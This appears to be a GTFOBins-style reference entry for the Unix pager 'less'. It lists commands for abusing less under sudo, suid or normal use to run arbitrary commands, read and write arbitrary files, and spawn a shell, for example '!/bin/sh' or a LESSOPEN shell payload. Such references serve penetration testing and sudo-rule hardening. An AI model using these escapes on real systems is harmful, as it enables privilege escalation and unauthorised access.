---
type: gtfobin
name: less
platform: Unix
functions: [command, file-read, file-write, inherit, shell]
tags: [gtfobin, unix, lotl]
---

# less

## command

```bash
cp /path/to/command ~/.lessfilter
less /etc/hosts
```
**Contexts:** unprivileged

```bash
LESSOPEN='/path/to/command # %s' less /etc/hosts
```
**Contexts:** sudo, unprivileged

## file-read

```bash
less /path/to/input-file
```
**Contexts:** sudo, suid, unprivileged

```bash
less /etc/hosts
:e /path/to/input-file
```
_This can be used to read another file, e.g., when invoked as a pager with some fixed content._
**Contexts:** sudo, suid, unprivileged

```bash
LESSOPEN='echo /path/to/input-file # %s' less /etc/hosts
```
_This can be used to read another file._
**Contexts:** sudo, unprivileged

## file-write

```bash
echo DATA | less
s/path/to/output-file
q
```
**Contexts:** sudo, suid, unprivileged

## inherit

```bash
less /etc/hosts
v
```
**Contexts:** sudo, suid, unprivileged

## shell

```bash
less /etc/hosts
!/bin/sh
```
**Contexts:** sudo, suid, unprivileged

```bash
LESSOPEN="/bin/sh -s 1>&0 2>&0 # %s" less /etc/hosts
reset
```
_The optional `reset` command is needed to receive the echo back of the typed keystrokes._
**Contexts:** sudo, unprivileged

```bash
VISUAL='/bin/sh -s --' less /etc/hosts
v
```
**Contexts:** sudo, unprivileged
